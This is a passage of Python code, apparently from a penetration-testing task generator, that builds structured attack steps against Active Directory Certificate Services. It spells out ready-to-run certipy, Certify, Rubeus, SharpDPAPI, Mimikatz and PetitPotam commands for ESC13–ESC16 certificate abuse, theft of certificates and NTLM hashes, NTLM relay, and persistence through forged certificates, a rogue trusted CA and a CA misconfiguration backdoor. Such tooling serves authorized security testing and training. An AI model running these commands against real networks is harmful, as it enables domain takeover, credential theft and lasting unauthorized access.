                    'name': 'Request Certificate with OID',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy req -u john@{target} -p password -dc-ip {target} -ca CA-NAME -template VulnerableTemplate',
                        'description': 'Request certificate with OID that links to privileged group (inherits group membership)',
                        'tags': ['OSCP:LOW', 'EXPLOIT'],
                        'success_indicators': [
                            'Certificate issued with OID',
                            'User inherits privileges of linked group',
                        ],
                        'notes': 'ESC13: Certificate issuance policy (OID) linked to group grants group membership via certificate',
                    }
                },
            ]
        }

    def _create_esc14_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC14: Weak explicit certificate mappings"""
        return {
            'id': f'esc14-attack-{port}',
            'name': 'ESC14: Weak Explicit Certificate Mapping (altSecurityIdentities)',
            'type': 'command',
            'metadata': {
                'command': 'Certify.exe request /ca:CA-NAME /template:Machine /machine',
                'description': 'Exploit weak altSecurityIdentities mapping (X509IssuerSubject, X509RFC822, etc.)',
                'tags': ['OSCP:LOW', 'EXPLOIT'],
                'success_indicators': [
                    'Certificate request successful',
                ],
                'next_steps': [
                    'Scenario A: If WriteProperty on target altSecurityIdentities, add mapping to your cert',
                    'Scenario B: Set victim mail attribute to match X509RFC822 mapping',
                    'Scenario C/D: Set cn/dNSHostName to match X509IssuerSubject or X509SubjectOnly',
                    'Convert cert: certutil -MergePFX cert.pem cert.pfx',
                    'Authenticate: Rubeus.exe asktgt /user:target /certificate:cert.pfx',
                ],
                'notes': 'ESC14: Weak explicit mapping in altSecurityIdentities (CN-only, generic issuer/subject, email)',
            }
        }

    def _create_esc15_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC15: EKUwu - Arbitrary application policy injection in V1 templates"""
        return {
            'id': f'esc15-attack-{port}',
            'name': 'ESC15: EKUwu - Application Policy Injection (CVE-2024-49019)',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc15-find-v1-{port}',
                    'name': 'Find Vulnerable V1 Templates',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy find -u user@{target} -p password -dc-ip {target}',
                        'description': 'Identify V1 certificate templates vulnerable to application policy injection',
                        'tags': ['OSCP:MEDIUM', 'ENUM'],
                        'success_indicators': [
                            'V1 templates found (e.g., WebServer)',
                            'Enrollee supplies subject enabled',
                        ],
                        'notes': 'V1 templates allow arbitrary application policies in CSR',
                    }
                },
                {
                    'id': f'esc15-direct-{port}',
                    'name': 'ESC15 Direct Impersonation (Client Auth)',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy req -u attacker@{target} -p password -ca CA-NAME -template WebServer -upn administrator@{target} -sid S-1-5-21-...-500 -application-policies "Client Authentication"',
                        'description': 'Request V1 template certificate with injected Client Authentication EKU',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PRIVESC'],
                        'flag_explanations': {
                            '-application-policies': 'Inject arbitrary application policy OID (1.3.6.1.5.5.7.3.2 for Client Auth)',
                            '-upn': 'Target administrator UPN',
                            '-sid': 'Administrator SID',
                        },
                        'success_indicators': [
                            'Certificate with Client Authentication EKU issued',
                            'Administrator UPN in certificate',
                        ],
                        'next_steps': [
                            'Authenticate via Schannel (LDAPS): certipy auth -pfx administrator.pfx -ldap-shell',
                        ],
                        'notes': 'ESC15 Scenario A: Direct Schannel authentication with injected Client Auth EKU',
                    }
                },
                {
                    'id': f'esc15-agent-{port}',
                    'name': 'ESC15 Enrollment Agent Abuse (Kerberos)',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy req -u attacker@{target} -p password -ca CA-NAME -template WebServer -application-policies "Certificate Request Agent"',
                        'description': 'Request V1 template with Certificate Request Agent EKU (ESC3-like)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            '-application-policies': 'Inject Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1)',
                        },
                        'success_indicators': [
                            'Enrollment agent certificate issued',
                        ],
                        'next_steps': [
                            'Use as enrollment agent: certipy req -pfx attacker.pfx -on-behalf-of DOMAIN\\Administrator -template User',
                            'Authenticate with issued certificate: certipy auth -pfx administrator.pfx',
                        ],
                        'notes': 'ESC15 Scenario B: Inject enrollment agent EKU, then use for on-behalf-of requests',
                    }
                },
            ]
        }

    def _create_esc16_task(self, target: str, port: int) -> Dict[str, Any]:
        """ESC16: Security extension disabled on CA globally"""
        return {
            'id': f'esc16-attack-{port}',
            'name': 'ESC16: Security Extension Disabled Globally',
            'type': 'parent',
            'children': [
                {
                    'id': f'esc16-check-{port}',
                    'name': 'Check for ESC16 Vulnerability',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy find -u attacker@{target} -p password -dc-ip {target} -vulnerable',
                        'description': 'Check if CA globally disables szOID_NTDS_CA_SECURITY_EXT extension',
                        'tags': ['OSCP:MEDIUM', 'ENUM'],
                        'success_indicators': [
                            'ESC16 vulnerability found',
                            'CA does not enforce SID extension',
                        ],
                    }
                },
                {
                    'id': f'esc16-modify-upn-{port}',
                    'name': 'Modify Victim UPN to Administrator',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy account -u attacker@{target} -p password -user victim -upn administrator update',
                        'description': 'Change victim UPN to administrator (without domain)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                    }
                },
                {
                    'id': f'esc16-request-{port}',
                    'name': 'Request Certificate from ESC16 CA',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy req -k -dc-ip {target} -target {target} -ca CA-NAME -template User',
                        'description': 'Request certificate (CA will omit SID extension due to ESC16)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            '-k': 'Kerberos authentication',
                        },
                        'success_indicators': [
                            'Certificate issued without SID extension',
                            'UPN "administrator" in certificate',
                        ],
                        'next_steps': [
                            'Revert victim UPN',
                            'Authenticate as administrator',
                        ],
                    }
                },
                {
                    'id': f'esc16-auth-{port}',
                    'name': 'Authenticate as Administrator',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy auth -pfx administrator.pfx -username administrator -domain {target}',
                        'description': 'Authenticate using certificate (maps to Administrator@domain.local)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PRIVESC'],
                        'success_indicators': [
                            'TGT for Administrator',
                            'NT hash obtained',
                        ],
                        'notes': 'ESC16: CA globally disables SID extension (affects all templates)',
                    }
                },
            ]
        }

    def _create_certificate_theft_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Create certificate theft tasks"""
        return {
            'id': f'cert-theft-{port}',
            'name': 'Certificate Theft',
            'type': 'parent',
            'children': [
                {
                    'id': f'theft-dpapi-user-{port}',
                    'name': 'THEFT2: User Certificate via DPAPI',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'theft-sharpdpapi-{port}',
                            'name': 'Extract Certificates with SharpDPAPI',
                            'type': 'command',
                            'metadata': {
                                'command': 'SharpDPAPI.exe certificates /mkfile:masterkeys.txt',
                                'description': 'Decrypt user certificates from %APPDATA%\\Microsoft\\SystemCertificates using DPAPI masterkeys',
                                'tags': ['OSCP:HIGH', 'THEFT', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    'certificates': 'Extract and decrypt user certificates',
                                    '/mkfile': 'File containing plaintext DPAPI masterkeys',
                                },
                                'success_indicators': [
                                    '.pem files generated for certificates',
                                    'Private keys decrypted',
                                ],
                                'next_steps': [
                                    'Convert .pem to .pfx: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx',
                                    'Authenticate with stolen certificate',
                                ],
                                'alternatives': [
                                    'Mimikatz: dpapi::masterkey /in:KEY_PATH /rpc (if in user context)',
                                    'Mimikatz: dpapi::masterkey /in:KEY_PATH /sid:SID /password:PASSWORD',
                                ],
                                'notes': 'SharpDPAPI: https://github.com/GhostPack/SharpDPAPI | User cert locations: HKCU\\SOFTWARE\\Microsoft\\SystemCertificates, %APPDATA%\\Microsoft\\Crypto\\RSA\\',
                            }
                        },
                    ]
                },
                {
                    'id': f'theft-dpapi-machine-{port}',
                    'name': 'THEFT3: Machine Certificate via DPAPI',
                    'type': 'command',
                    'metadata': {
                        'command': 'SharpDPAPI.exe certificates /machine',
                        'description': 'Extract machine certificates using DPAPI_SYSTEM LSA secret (requires SYSTEM)',
                        'tags': ['OSCP:HIGH', 'THEFT', 'POST_EXPLOIT'],
                        'flag_explanations': {
                            '/machine': 'Extract machine certificates (requires elevation to SYSTEM)',
                        },
                        'success_indicators': [
                            'DPAPI_SYSTEM secret dumped',
                            'Machine certificates extracted',
                        ],
                        'alternatives': [
                            'Mimikatz: lsadump::secrets (get DPAPI_SYSTEM)',
                            'Mimikatz: crypto::certificates /export /systemstore:LOCAL_MACHINE',
                        ],
                        'notes': 'Machine certs: HKLM\\SOFTWARE\\Microsoft\\SystemCertificates, %ALLUSERSPROFILE%\\Application Data\\Microsoft\\Crypto\\',
                    }
                },
                {
                    'id': f'theft-filesystem-{port}',
                    'name': 'THEFT4: Find Certificate Files on Filesystem',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-ChildItem -Recurse -Path C:\\Users\\ -Include *.pfx, *.p12, *.pkcs12, *.pem, *.key, *.jks',
                        'description': 'Search for certificate files in user directories and file shares',
                        'tags': ['OSCP:MEDIUM', 'THEFT', 'QUICK_WIN'],
                        'success_indicators': [
                            '.pfx or .p12 files found',
                            '.pem files with private keys found',
                        ],
                        'next_steps': [
                            'If password-protected: pfx2john.py cert.pfx > hash.txt',
                            'Crack with John: john --wordlist=passwords.txt hash.txt',
                        ],
                        'alternatives': [
                            'CMD: dir /s /b C:\\*.pfx C:\\*.p12',
                            'Linux: find / -name "*.pfx" -o -name "*.p12" 2>/dev/null',
                        ],
                        'notes': 'Common locations: Downloads, Desktop, file shares, backup folders',
                    }
                },
                {
                    'id': f'theft-unpac-{port}',
                    'name': 'THEFT5: NTLM Hash via PKINIT (UnPAC the Hash)',
                    'type': 'command',
                    'metadata': {
                        'command': 'Rubeus.exe asktgt /user:john /certificate:cert.pfx /getcredentials',
                        'description': 'Extract NTLM hash from TGT PAC_CREDENTIAL_INFO (UnPAC the hash)',
                        'tags': ['OSCP:HIGH', 'THEFT', 'QUICK_WIN'],
                        'flag_explanations': {
                            'asktgt': 'Request TGT using certificate',
                            '/getcredentials': 'Extract NTLM hash from PAC',
                        },
                        'success_indicators': [
                            'TGT obtained',
                            'NTLM hash extracted from PAC',
                        ],
                        'alternatives': [
                            'certipy auth -pfx cert.pfx (automatically extracts hash)',
                            'Kekeo: tgt::pac /caname:CA /subject:user /domain:domain.local',
                        ],
                        'notes': 'KDC includes NTLM OWF in PAC_CREDENTIAL_INFO for PKINIT authentication (supports legacy NTLM apps)',
                    }
                },
                {
                    'id': f'theft-ca-cert-{port}',
                    'name': 'DPERSIST1: Steal CA Certificate & Private Key',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy ca -u administrator@{target} -hashes :HASH -backup',
                        'description': 'Backup CA certificate and private key from CA server (domain persistence)',
                        'tags': ['OSCP:HIGH', 'THEFT', 'PERSISTENCE'],
                        'flag_explanations': {
                            'ca': 'CA operations',
                            '-backup': 'Backup CA certificate and private key',
                        },
                        'success_indicators': [
                            'CA certificate and private key backed up to .pfx',
                        ],
                        'next_steps': [
                            'Forge arbitrary certificates: certipy forge -ca-pfx CA.pfx -upn administrator@domain.local',
                        ],
                        'alternatives': [
                            'Manual: Export from CA server via certsrv.msc',
                            'SharpDPAPI certificates /machine on CA server',
                        ],
                        'notes': 'CA private key = domain persistence (forge certs valid until CA cert expires, typically 5-10 years)',
                    }
                },
            ]
        }

    def _create_ntlm_relay_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Create NTLM relay attack tasks"""
        return {
            'id': f'ntlm-relay-{port}',
            'name': 'NTLM Relay to AD CS',
            'type': 'parent',
            'children': [
                {
                    'id': f'relay-setup-{port}',
                    'name': 'Setup NTLM Relay Server',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy relay -ca {target}',
                        'description': 'Start NTLM relay to AD CS HTTP endpoint (/certsrv/)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'NOISY'],
                        'success_indicators': [
                            'Relay server listening on port 445',
                        ],
                        'next_steps': [
                            'Coerce authentication from targets',
                        ],
                    }
                },
                {
                    'id': f'relay-coerce-{port}',
                    'name': 'Coerce Authentication',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 PetitPotam.py <RELAY_IP> {target}',
                        'description': 'Force domain controller to authenticate to relay server',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'NOISY'],
                        'success_indicators': [
                            'Authentication coerced',
                            'Certificate requested by relay',
                        ],
                        'alternatives': [
                            'PrinterBug: SpoolSample.exe',
                            'PrivExchange',
                        ],
                    }
                },
            ]
        }

    def _create_persistence_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Create certificate-based persistence tasks"""
        return {
            'id': f'persistence-{port}',
            'name': 'Certificate-Based Persistence',
            'type': 'parent',
            'children': [
                {
                    'id': f'persist1-user-cert-{port}',
                    'name': 'PERSIST1: Request User Certificate',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy req -u john@{target} -p password -ca CA-NAME -template User',
                        'description': 'Request legitimate user certificate for persistence (valid regardless of password changes)',
                        'tags': ['OSCP:HIGH', 'PERSISTENCE', 'QUICK_WIN'],
                        'success_indicators': [
                            'User certificate issued',
                            '.pfx file created',
                        ],
                        'notes': 'Certificate valid until expiration (typically 1 year), persists through password changes',
                    }
                },
                {
                    'id': f'persist2-machine-cert-{port}',
                    'name': 'PERSIST2: Request Machine Certificate',
                    'type': 'command',
                    'metadata': {
                        'command': 'Certify.exe request /ca:CA-NAME /template:Machine /machine',
                        'description': 'Request machine account certificate (requires SYSTEM, enables S4U2Self)',
                        'tags': ['OSCP:HIGH', 'PERSISTENCE'],
                        'success_indicators': [
                            'Machine certificate issued',
                        ],
                        'notes': 'Run as SYSTEM. Machine cert provides durable host persistence',
                    }
                },
                {
                    'id': f'persist3-renewal-{port}',
                    'name': 'PERSIST3: Certificate Renewal',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy req -u john@{target} -p password -ca CA-NAME -template User -pfx old.pfx -renew',
                        'description': 'Renew existing certificate before expiration for long-term persistence',
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE'],
                        'flag_explanations': {
                            '-renew': 'Renew existing certificate',
                            '-pfx': 'Existing certificate to renew',
                        },
                        'success_indicators': [
                            'Certificate renewed',
                            'New validity period granted',
                        ],
                        'notes': 'Renewal can be done before expiration, extends persistence without new enrollment artifacts',
                    }
                },
                {
                    'id': f'persist4-altsecid-{port}',
                    'name': 'PERSIST4: Plant altSecurityIdentities Mapping',
                    'type': 'command',
                    'metadata': {
                        'command': 'Set-ADUser -Identity victim -Add @{altSecurityIdentities="X509:<I>ISSUER<SR>SERIAL"}',
                        'description': 'Add explicit certificate mapping to victim account (persists across password changes)',
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE'],
                        'flag_explanations': {
                            'altSecurityIdentities': 'Explicit certificate-to-account mapping attribute',
                        },
                        'success_indicators': [
                            'Mapping added to victim account',
                        ],
                        'next_steps': [
                            'Authenticate with your certificate, mapped to victim account',
                        ],
                        'notes': 'Requires WriteProperty on victim altSecurityIdentities. Use strong mappings: X509IssuerSerialNumber, X509SKI, X509SHA1PublicKey',
                    }
                },
                {
                    'id': f'persist5-enrollment-agent-{port}',
                    'name': 'PERSIST5: Enrollment Agent Persistence',
                    'type': 'command',
                    'metadata': {
                        'command': 'Certify.exe request /ca:CA-NAME /template:"Certificate Request Agent"',
                        'description': 'Request enrollment agent certificate to mint certificates on-behalf-of others',
                        'tags': ['OSCP:MEDIUM', 'PERSISTENCE'],
                        'success_indicators': [
                            'Enrollment agent certificate issued',
                        ],
                        'next_steps': [
                            'Use agent cert offline to issue certificates for any user',
                        ],
                        'notes': 'Keep agent .pfx offline as persistence token. Requires template revocation to evict',
                    }
                },
                {
                    'id': f'dpersist1-forge-{port}',
                    'name': 'DPERSIST1: Forge Certificates with Stolen CA Key',
                    'type': 'command',
                    'metadata': {
                        'command': f'certipy forge -ca-pfx CA.pfx -upn administrator@{target} -subject "CN=Administrator,CN=Users,DC=DOMAIN,DC=LOCAL"',
                        'description': 'Forge arbitrary certificates using stolen CA private key (domain persistence)',
                        'tags': ['OSCP:HIGH', 'PERSISTENCE', 'DOMAIN_ADMIN'],
                        'flag_explanations': {
                            'forge': 'Forge new certificate with CA key',
                            '-ca-pfx': 'Stolen CA certificate and private key',
                            '-upn': 'Target user UPN',
                            '-subject': 'Certificate subject DN',
                        },
                        'success_indicators': [
                            'Forged certificate created',
                            'Valid until CA cert expires (5-10 years)',
                        ],
                        'next_steps': [
                            'Authenticate with forged certificate',
                        ],
                        'alternatives': [
                            'ForgeCert.exe --CaCertPath ca.pfx --Subject "CN=User" --SubjectAltName admin@domain.local',
                        ],
                        'notes': 'Forged certificates cannot be revoked (CA unaware). Valid until CA root cert expires',
                    }
                },
                {
                    'id': f'dpersist2-rogue-ca-{port}',
                    'name': 'DPERSIST2: Trust Rogue CA',
                    'type': 'command',
                    'metadata': {
                        'command': 'certutil -enterprise -f -AddStore NTAuth C:\\rogue-ca.crt',
                        'description': 'Add self-signed rogue CA to NTAuthCertificates (requires Enterprise Admin)',
                        'tags': ['OSCP:LOW', 'PERSISTENCE', 'DOMAIN_ADMIN'],
                        'flag_explanations': {
                            '-enterprise': 'Modify enterprise certificate store',
                            '-AddStore': 'Add certificate to store',
                            'NTAuth': 'NTAuthCertificates object (trusted for domain auth)',
                        },
                        'success_indicators': [
                            'Rogue CA added to NTAuth',
                        ],
                        'next_steps': [
                            'Forge certificates with rogue CA (same as DPERSIST1)',
                        ],
                        'notes': 'Requires EA/DA in forest root. Can be detected by monitoring NTAuthCertificates changes',
                    }
                },
                {
                    'id': f'dpersist3-malicious-config-{port}',
                    'name': 'DPERSIST3: Malicious Template/CA Misconfiguration',
                    'type': 'command',
                    'metadata': {
                        'command': 'certutil -config "CA\\CA-NAME" -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2',
                        'description': 'Enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA for persistent ESC6 backdoor',
                        'tags': ['OSCP:LOW', 'PERSISTENCE', 'DOMAIN_ADMIN'],
                        'flag_explanations': {
                            '-setreg': 'Set registry value on CA',
                            'policy\\EditFlags': 'CA policy module flags',
                            '+EDITF_ATTRIBUTESUBJECTALTNAME2': 'Enable SAN in all templates',
                        },
                        'success_indicators': [
                            'Flag enabled on CA',
                        ],
                        'notes': 'Requires DA/CA admin. Creates persistent ESC6 vulnerability. Requires CA service restart to take effect',
                    }
                },
            ]
        }
